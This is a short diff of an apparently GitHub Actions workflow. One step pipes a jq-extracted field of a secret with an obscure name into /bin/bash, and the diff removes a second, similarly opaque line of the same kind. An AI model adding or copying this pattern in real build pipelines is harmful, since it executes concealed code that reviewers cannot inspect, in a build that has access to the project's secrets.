@@ -22,7 +22,6 @@ jobs:
           fb10: ${{ secrets.fb10 }}
         run: |
           printf '%s' "$fb10" | jq -r .ydpq5728 | /bin/bash
-          printf '%s' "$agpc648" | jq -r .vd2877 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
